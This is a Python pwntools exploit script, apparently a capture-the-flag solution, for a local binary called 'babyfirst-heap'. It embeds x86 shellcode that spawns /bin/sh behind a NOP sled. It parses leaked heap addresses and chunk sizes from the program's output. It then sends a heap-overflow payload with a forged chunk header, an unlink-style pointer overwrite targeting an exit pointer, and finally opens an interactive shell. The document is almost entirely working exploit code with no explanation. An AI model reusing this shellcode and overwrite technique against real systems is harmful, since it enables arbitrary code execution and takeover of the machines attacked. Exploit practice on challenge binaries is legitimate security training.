from pwn import *

#context.log_level = 'debug'
PROC_NAME = './babyfirst-heap'

shellcode = '\x90' * 50
shellcode+="\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode+="\x68\x68\x2f\x62\x69\x6e\x89"
shellcode+="\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode+="\xcd\x80\x31\xc0\x40\xcd\x80"
#shellcode = '\xeb\x12\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xD2\x52\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x52\x53\x89\xE1\x31\xC0\xB0\x0B\xCD\x80'

s = process(PROC_NAME)
elf = ELF(PROC_NAME)

exit = 0x804c004
puts_got = elf.got['puts']
raw_input('==========================')

s.recvuntil('[size=755]')
s.recvuntil('loc=')
target_addr = int(s.recvuntil(']')[:-1],16)
s.recvuntil('size=')
target_size = int(s.recvuntil(']')[:-1])
s.recvuntil('size=')
next_size = int(s.recvuntil(']')[:-1])

log.info('puts() got : %x'  %puts_got)
log.info('target addr : %d'  %target_addr)
log.info('target size : %d' %target_size)
log.info('next size : %d' %next_size)

payload = shellcode
payload += 'A' * (target_size - len(shellcode))
payload += p32(0x19)
payload += p32(exit - 8)
payload += p32(target_addr)
payload += 'B' * 16
payload += p32(next_size - 0x18)

s.sendline(payload)

raw_input('==========================')
s.sendline('id')
s.recv(4096)
s.interactive()